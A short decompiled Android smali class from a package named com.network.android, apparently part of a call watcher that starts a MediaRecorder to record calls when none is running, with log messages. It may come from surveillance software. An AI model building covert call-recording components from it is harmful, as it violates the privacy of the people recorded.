.class final Lcom/network/android/a;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Lcom/network/android/AndroidCallDirectWatcher;


# direct methods
.method constructor <init>(Lcom/network/android/AndroidCallDirectWatcher;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/network/android/a;->b:Lcom/network/android/AndroidCallDirectWatcher;

    iput-object p2, p0, Lcom/network/android/a;->a:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 1

    invoke-static {}, Lcom/network/media/r;->b()Landroid/media/MediaRecorder;

    move-result-object v0

    if-nez v0, :cond_0

    const-string v0, "AndroidCallDirectWatcher record starting to record"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/a;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/media/r;->a(Landroid/content/Context;)V

    :goto_0
    return-void

    :cond_0
    const-string v0, "AndroidCallDirectWatcher record not equal to null. we are not recording"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_0
.end method
